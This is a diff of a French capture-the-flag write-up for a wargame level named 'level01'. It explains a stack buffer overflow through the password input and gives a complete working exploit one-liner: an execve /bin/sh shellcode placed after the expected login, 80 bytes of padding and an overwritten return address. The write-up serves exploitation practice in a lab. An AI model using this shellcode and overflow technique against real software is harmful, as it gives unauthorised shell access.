@@ -2,9 +2,11 @@
 On a un programme qui demande un login et un password
 Le login doit être égal à "dat_wil" pour que le programme continue.
 Le password n'a pas d'importance, que ça match "admin" ou non on exit
-Le premier fgets (celui pour le login) met notre input dans une variable globale, on ne peut rien faire ici, cependant le second (celui pour le password) le met sur la stack du main, jusqu'à 100 bytes.
-Le buffer accueillant l'input fait que 64 bytes. La sauvegarde d'eip est à 0xffffd71c, esp est à 0xffffd6b0 et le buffer est à esp + 0x1c, soit 0xffffd6cc; En faisant eip-[buffer] on trouve 80.
-Il faut donc ecrire 80 char dans le buffer pour ecraser la sauvegarder d'eip ensuite.
-Il y a plusieurs methodes pour lancer un shell, on peut ecrire un shellcode dans l'env ou dans la variable a_user_name, derrière "dat_wil"; C'est comme cela que j'ai fait. J'écris ensuite l'adresse de a_user_name + 7 (pour passer le "dat_wil").
+Le premier fgets (celui pour le login) met notre input dans une variable globale.
+On ne peut rien faire ici, cependant le second (celui pour le password) le met dans un buffer du main, jusqu'à 100 bytes.
+La sauvegarde d'eip du main est à 80 bytes du buffer, on peut donc écrire jusqu'à écraser cette valeur.
+Il y a plusieurs methodes pour lancer un shell, on peut écrire un shellcode dans l'env 
+ou dans la variable a_user_name, derrière "dat_wil"; C'est comme cela que j'ai fait.
+J'écris ensuite l'adresse de a_user_name + 7 (pour passer le "dat_wil").
 Ce qui nous donne comme entrée:
-cat <(python -c 'print "dat_wil"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A"*80 + "\x47\xa0\x04\x08"') - | ./level01
+cat <(python -c 'print "dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A"*80 + "\x47\xa0\x04\x08"') - | ./level01
